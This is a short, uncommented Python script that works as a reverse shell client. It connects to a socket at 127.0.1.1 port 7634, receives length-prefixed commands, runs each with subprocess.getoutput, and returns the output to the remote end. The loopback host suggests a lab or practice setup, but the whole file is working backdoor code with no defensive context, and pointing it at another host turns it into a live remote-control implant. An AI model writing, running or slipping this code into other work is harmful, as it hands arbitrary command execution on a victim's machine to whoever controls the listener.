import socket
import subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host = "127.0.1.1"
port = 7634
HEADER = 64

s.connect((host,port))
while True:
    cmd_len = s.recv(HEADER).decode()
    cmd_len = int(cmd_len)
    s_cmd=s.recv(cmd_len)
    cmd = s_cmd.decode()
    c_cmd = subprocess.getoutput(cmd)
    cmd_len = len(c_cmd)
    cmd_len = str(cmd_len).encode()
    cmd_len += b' ' * (HEADER - len(cmd_len))
    s.send(cmd_len)
    s.send(c_cmd.encode())
